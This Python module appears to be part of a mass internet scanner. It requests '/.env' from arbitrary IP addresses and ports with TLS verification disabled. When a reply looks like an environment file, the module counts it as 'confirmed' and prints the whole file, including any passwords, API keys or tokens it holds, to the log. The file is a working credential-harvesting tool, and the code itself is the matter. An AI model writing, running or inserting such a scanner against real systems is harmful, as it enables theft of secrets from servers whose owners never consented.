import asyncio

import aiohttp

import scanner
from report import logger
from .envparser import Envfile


_TIMEOUT = aiohttp.ClientTimeout(total=8.0)
_MAX_BYTES = 262144


async def _read_capped(resp: aiohttp.ClientResponse) -> bytes:
    raw = bytearray()
    async for chunk in resp.content.iter_chunked(8192):
        raw.extend(chunk)
        if len(raw) >= _MAX_BYTES:
            break
    return bytes(raw[:_MAX_BYTES])


async def _fetch_envf(ctx: scanner.ScanContext, ip: str, port: int) -> str | None:
    scheme = "https" if port == 443 else "http"
    url = f"{scheme}://{ip}:{port}/.env"

    try:
        async with aiohttp.ClientSession(timeout=_TIMEOUT) as session:
            async with session.get(url, ssl=False) as resp:
                if resp.status != 200 or resp.content_type == "text/html":
                    return None
                body = await _read_capped(resp)
    except asyncio.TimeoutError:
        return None  # no reply: filtered, dropped, or host is down
    except aiohttp.ClientError:
        return None
    except ConnectionResetError:
        return None

    text = body.decode("utf-8", errors="replace").strip()
    return text or None


async def http_grab_envf(*, ctx: scanner.ScanContext, ip: str, port: int) -> None:
    if ctx.event.is_set():
        return
    text = await _fetch_envf(ctx, ip, port)
    if text is None or ctx.event.is_set() or not Envfile.is_env(text):
        return
    ctx.stats.confirmed_inc()
    logger.sprint(f"{ip}:{port} -> /.env\n{text}")
